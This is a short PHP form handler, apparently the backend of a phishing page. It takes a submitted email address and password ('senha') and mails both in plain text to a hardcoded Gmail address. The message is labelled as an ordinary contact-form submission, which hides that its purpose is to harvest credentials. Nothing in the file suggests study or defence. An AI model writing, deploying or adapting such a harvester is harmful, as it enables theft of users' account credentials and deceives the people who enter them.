<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST["email"];
  $senha = $_POST["senha"];
  $assunto = "Novo contato do formulário de contato";
  $mensagem = "Email: " . $email . "\nSenha: " . $senha;
  $headers = "From: ganjugaj@gmail.com";

ini_set('SMTP', 'smtp.gmail.com');
ini_set('smtp_port', 587);

  if (mail("ganjugaj@gmail.com", $assunto, $mensagem, $headers)) {
    echo "Mensagem enviada com sucesso!";
  } else {
    echo "Ocorreu um erro ao enviar a mensagem. Por favor, tente novamente mais tarde.";
  }
}
?>